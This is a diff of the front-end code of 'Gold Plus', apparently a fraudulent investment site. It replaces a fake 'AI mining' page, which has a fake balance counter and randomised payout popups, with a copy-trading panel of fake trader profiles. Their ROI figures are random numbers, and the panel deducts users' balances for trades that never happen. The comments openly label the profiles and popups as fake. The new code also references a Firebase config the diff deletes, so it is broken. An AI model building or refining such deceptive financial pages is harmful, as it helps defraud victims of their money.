@@ -1,192 +1,129 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gold Plus - Mining & Holding</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root { --gold-grad: linear-gradient(135deg, #f1c40f, #e67e22); --card-bg: rgba(255, 255, 255, 0.08); --primary-gold: #f1c40f; }
-        body { margin: 0; font-family: 'Poppins', sans-serif; background: #0f051d; color: white; padding-bottom: 90px; overflow-x: hidden; }
-        
-        .header { padding: 25px 20px; background: rgba(0,0,0,0.3); border-bottom: 1px solid rgba(241, 196, 15, 0.2); border-radius: 0 0 30px 30px; text-align: center; }
-        .header h2 { margin: 0; color: var(--primary-gold); font-size: 20px; text-transform: uppercase; letter-spacing: 2px; }
+<style>
+    .expert-container { margin-top: 20px; text-align: left; }
+    .expert-card { 
+        background: rgba(255, 255, 255, 0.04); 
+        border: 1px solid rgba(255,255,255,0.1); 
+        border-radius: 15px; 
+        padding: 12px; 
+        margin-bottom: 10px; 
+        display: flex; 
+        align-items: center; 
+        justify-content: space-between;
+    }
+    .expert-info { display: flex; align-items: center; gap: 10px; }
+    .expert-info img { width: 40px; height: 40px; border-radius: 50%; border: 2px solid var(--primary-gold); }
+    .expert-meta b { display: block; font-size: 13px; color: #fff; }
+    .expert-meta span { font-size: 10px; color: #00ff64; }
+    
+    .copy-btn-sm { 
+        background: var(--primary-gold); 
+        color: #000; 
+        border: none; 
+        padding: 6px 12px; 
+        border-radius: 8px; 
+        font-size: 11px; 
+        font-weight: bold; 
+        cursor: pointer; 
+    }
+    
+    .live-badge { 
+        background: red; 
+        color: white; 
+        font-size: 8px; 
+        padding: 2px 5px; 
+        border-radius: 4px; 
+        margin-left: 5px; 
+        animation: blink 1s infinite;
+    }
+    @keyframes blink { 50% { opacity: 0.3; } }
+</style>
 
-        /* Robot Mining Section */
-        .mining-card { background: var(--card-bg); border: 1px solid rgba(255,255,255,0.1); margin: 20px; padding: 25px; border-radius: 25px; text-align: center; backdrop-filter: blur(10px); position: relative; overflow: hidden; }
-        
-        /* Coin & Scan Effect */
-        .coin-box { position: relative; width: 100px; height: 100px; margin: 0 auto 15px; }
-        .coin-box img { width: 80px; animation: rotate 3s linear infinite; filter: drop-shadow(0 0 15px gold); }
-        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #00ff64; box-shadow: 0 0 15px #00ff64; animation: scan 2s linear infinite; display: none; }
-        
-        @keyframes rotate { 0% { transform: rotateY(0deg); } 100% { transform: rotateY(360deg); } }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-
-        #liveBalance { font-size: 32px; color: #fff; display: block; margin: 10px 0; text-shadow: 0 0 15px gold; font-weight: bold; font-family: monospace; }
-        
-        .action-btn { background: var(--gold-grad); color: #000; border: none; width: 100%; padding: 16px; border-radius: 15px; font-weight: 800; cursor: pointer; box-shadow: 0 5px 20px rgba(241,196,15,0.4); font-size: 16px; transition: 0.3s; }
-        .action-btn:disabled { background: #444 !important; color: #888 !important; cursor: not-allowed; box-shadow: none; }
-
-        /* Holding Section */
-        .hold-title { padding: 10px 20px; font-size: 14px; color: var(--primary-gold); font-weight: bold; display: flex; align-items: center; gap: 8px; margin-top: 10px; }
-        .hold-card { background: var(--card-bg); border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; padding: 18px; margin: 0 20px 15px; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
-        .hold-info b { font-size: 18px; display: block; color: #fff; }
-        .hold-info span { font-size: 12px; color: #00ff64; font-weight: bold; }
-        .hold-btn { background: #fff; color: #000; border: none; padding: 10px 20px; border-radius: 12px; font-weight: bold; font-size: 12px; cursor: pointer; }
-
-        /* Fake Payout Toast */
-        #payout-toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(15, 5, 29, 0.95); border: 1px solid var(--primary-gold); padding: 12px 20px; border-radius: 50px; display: none; z-index: 10001; box-shadow: 0 10px 30px rgba(0,0,0,0.8); min-width: 250px; text-align: center; font-size: 12px; border-left: 5px solid gold; }
-
-        .nav-bar { position: fixed; bottom: 0; width: 100%; background: #0a0414; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid rgba(241, 196, 15, 0.2); z-index: 1000; }
-        .nav-btn { color: #666; text-decoration: none; text-align: center; font-size: 10px; flex: 1; }
-        .nav-btn.active { color: #f1c40f; }
-        .nav-btn i { font-size: 20px; display: block; margin-bottom: 4px; }
-    </style>
-</head>
-<body>
-
-<div id="payout-toast">
-    <i class="fas fa-check-circle" style="color: gold; margin-right: 8px;"></i>
-    <span id="payout-msg"></span>
-</div>
-
-<div class="header">
-    <h2>Mining & Holding</h2>
-</div>
-
-<div class="mining-card">
-    <div class="coin-box">
-        <div class="scan-line" id="scanLine"></div>
-        <img src="https://cdn-icons-png.flaticon.com/512/2933/2933116.png">
+<div class="trade-card">
+    <div class="trade-title">
+        <i class="fas fa-users-gear"></i> TOP COPY TRADERS <span class="live-badge">LIVE</span>
     </div>
-    <span style="font-size: 11px; color: #aaa; text-transform: uppercase; letter-spacing: 1px;">AI Robot Mining Live</span>
-    <b id="liveBalance">$0.000000</b>
-    <button class="action-btn" id="claimBtn" onclick="startRobotWork()">START AI MINING</button>
-</div>
+    
+    <div id="expertList" class="expert-container">
+        </div>
 
-<div class="hold-title"><i class="fas fa-shield-alt"></i> 15 DAYS HOLDING (10% DAILY)</div>
-<div class="hold-card">
-    <div class="hold-info"><b>Rs. 3,000</b><span>Daily Earn: $1.08</span></div>
-    <button class="hold-btn" onclick="buyHold(3000)">HOLD NOW</button>
+    <div style="margin-top: 20px;">
+        <label style="font-size: 11px; color: #aaa; display: block; margin-bottom: 5px;">CUSTOM TRADE AMOUNT ($5 - $300)</label>
+        <input type="number" id="customTrade" value="5" min="5" max="300" style="width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid #333; color: gold; border-radius: 10px; text-align: center; font-weight: bold;">
+        <button class="action-btn" onclick="startCustomTrade()" style="margin-top: 15px; background: var(--gold-grad);">START COPY TRADING</button>
+    </div>
 </div>
-<div class="hold-card">
-    <div class="hold-info"><b>Rs. 7,000</b><span>Daily Earn: $2.52</span></div>
-    <button class="hold-btn" onclick="buyHold(7000)">HOLD NOW</button>
-</div>
-
-<nav class="nav-bar">
-    <a href="dashboard.html" class="nav-btn"><i class="fas fa-house"></i>HOME</a>
-    <a href="plans.html" class="nav-btn"><i class="fas fa-gem"></i>PLANS</a>
-    <a href="mining.html" class="nav-btn active"><i class="fas fa-coins"></i>EARN</a>
-    <a href="refer.html" class="nav-btn"><i class="fas fa-users"></i>REFER</a>
-    <a href="profile.html" class="nav-btn"><i class="fas fa-user-gear"></i>PROFILE</a>
-</nav>
 
 <script type="module">
-    // Firebase initialization (Same as your config)
+    // Firebase Config (Puraana wala hi use karein)
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getDatabase, ref, get, set, update, runTransaction } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+    import { getDatabase, ref, get, runTransaction } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyByanDKaCErU1mV7ebXd3KsuLWF55LbgnQ",
-      authDomain: "gold-plus-v1.firebaseapp.com",
-      databaseURL: "https://gold-plus-v1-default-rtdb.firebaseio.com",
-      projectId: "gold-plus-v1",
-      storageBucket: "gold-plus-v1.firebasestorage.app",
-      messagingSenderId: "474592887487",
-      appId: "1:474592887487:web:e9261d51df5af58a367c0a"
+    // Fake Profiles Data
+    const experts = [
+        { name: "Alex Crypto", img: "https://i.pravatar.cc/150?u=1", roi: "450%" },
+        { name: "Zain Master", img: "https://i.pravatar.cc/150?u=2", roi: "312%" },
+        { name: "Sarah Trade", img: "https://i.pravatar.cc/150?u=3", roi: "580%" },
+        { name: "Pro Scalper", img: "https://i.pravatar.cc/150?u=4", roi: "290%" }
+    ];
+
+    function loadExperts() {
+        const list = document.getElementById('expertList');
+        list.innerHTML = '';
+        experts.forEach(ex => {
+            // Har 4 ghante baad ROI change karne ka logic (Random)
+            const randomROI = (Math.random() * (600 - 200) + 200).toFixed(1);
+            list.innerHTML += `
+                <div class="expert-card">
+                    <div class="expert-info">
+                        <img src="${ex.img}">
+                        <div class="expert-meta">
+                            <b>${ex.name}</b>
+                            <span>ROI: +${randomROI}%</span>
+                        </div>
+                    </div>
+                    <button class="copy-btn-sm" onclick="setTradeAmount(25)">Copy</button>
+                </div>
+            `;
+        });
+    }
+
+    window.setTradeAmount = (amt) => {
+        document.getElementById('customTrade').value = amt;
+        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
     };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-    const userPhone = localStorage.getItem('userPhone');
+    window.startCustomTrade = async () => {
+        const phone = localStorage.getItem('userPhone');
+        const amt = parseFloat(document.getElementById('customTrade').value);
 
-    let userData = null;
-    let miningInterval;
-
-    // Robot Work Function
-    window.startRobotWork = async () => {
-        if (!userPhone) return;
-        const btn = document.getElementById('claimBtn');
-        const scan = document.getElementById('scanLine');
-        const balanceTxt = document.getElementById('liveBalance');
-
-        // Check 24h Lock
-        const now = Date.now();
-        const last = userData.lastClaim || 0;
-        if (now - last < 24 * 60 * 60 * 1000) {
-            alert("Robot is resting. Next session available in 24 hours!");
+        if (amt < 5 || amt > 300) {
+            alert("Min $5 and Max $300 allowed!");
             return;
         }
 
-        btn.disabled = true;
-        btn.innerText = "AI PROCESSING...";
-        scan.style.display = "block";
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        
+        const snap = await get(ref(db, 'users/' + phone));
+        const balance = snap.val().balance || 0;
 
-        // Fake Counter Animation
-        let count = 0;
-        const process = setInterval(() => {
-            count += 0.000123;
-            balanceTxt.innerText = "$" + count.toFixed(6);
-            balanceTxt.style.color = "#00ff64";
-        }, 100);
-
-        // 5 Seconds Work Delay
-        setTimeout(async () => {
-            clearInterval(process);
-            scan.style.display = "none";
-            
-            const reward = userData.dailyEarning || 0.50;
-            const result = await runTransaction(ref(db, 'users/' + userPhone), (curr) => {
-                if (curr) {
-                    curr.balance = (curr.balance || 0) + reward;
-                    curr.lastClaim = Date.now();
-                    return curr;
-                }
-            });
-
-            if (result.committed) {
-                alert(`Work Done! $${reward} added to your wallet.`);
-                location.reload();
-            }
-        }, 5000);
-    };
-
-    // Load User Data & UI Sync
-    async function init() {
-        const snap = await get(ref(db, 'users/' + userPhone));
-        if (snap.exists()) {
-            userData = snap.val();
-            const last = userData.lastClaim || 0;
-            const isLocked = (Date.now() - last < 24 * 60 * 60 * 1000);
-            
-            if(isLocked) {
-                document.getElementById('claimBtn').disabled = true;
-                document.getElementById('claimBtn').innerText = "SYSTEM COOLDOWN";
-                document.getElementById('liveBalance').innerText = "DONE";
-            }
+        if (balance < amt) {
+            alert("Insufficient Balance!");
+            return;
         }
-    }
 
-    // Fake Payout Popups
-    function startFakePopups() {
-        const names = ["Ahmad", "Sajid", "Usman", "Bilal", "Hamza", "Kamran", "Rashid", "Faisal", "Umair", "Waqas"];
-        const amounts = [3000, 7000, 11000, 5000, 15000];
-        setInterval(() => {
-            const n = names[Math.floor(Math.random()*names.length)];
-            const a = amounts[Math.floor(Math.random()*amounts.length)];
-            const toast = document.getElementById('payout-toast');
-            document.getElementById('payout-msg').innerHTML = `<b>${n}</b> just received <b>Rs. ${a.toLocaleString()}</b> payout!`;
-            toast.style.display = 'block';
-            setTimeout(() => toast.style.display='none', 4000);
-        }, 10000);
-    }
+        if(confirm(`Confirm copy trade of $${amt}?`)) {
+            await runTransaction(ref(db, 'users/' + phone), (u) => {
+                if (u) { u.balance -= amt; return u; }
+            });
+            alert("Expert started trading with your $" + amt + ". Results will be shown in 24 hours.");
+            location.reload();
+        }
+    };
 
     window.onload = () => {
-        init();
-        startFakePopups();
+        loadExperts();
+        // Har 4 ghante (14400000 ms) baad update karne ke liye
+        setInterval(loadExperts, 14400000); 
     };
 </script>
-</body>
-</html>
